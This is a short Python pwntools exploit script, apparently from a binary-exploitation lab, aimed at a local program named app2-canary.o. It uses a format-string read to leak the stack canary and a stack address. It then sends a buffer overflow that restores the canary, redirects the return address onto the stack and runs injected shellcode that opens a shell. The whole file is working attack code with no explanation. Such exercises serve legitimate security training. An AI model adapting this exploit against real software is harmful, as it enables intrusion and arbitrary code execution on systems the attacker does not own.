#!/bin/python3

from pwn import *
import sys

if len(sys.argv)==1:
    app_path = "./app2-canary.o"
else:
    app_path=sys.argv[1]

p = process(app_path)

gdb.attach(p)

payload1 = "-%17$x-%19$x"
p.sendline(payload1)
resp = p.recvline().decode().split("-")

p.readuntil("Please enter your name: \n")
b_addr = int(resp[1], 16)
canary = int(resp[2], 16)
info("canary = %#x", canary)
info("b_addr = %#x", b_addr)
payload = b"a"*48
payload += p32(canary)
payload += b"a"*12
payload += p32(b_addr-0xc8+20)
payload += asm(shellcraft.sh())
p.sendline(payload)
p.interactive()
p.close()
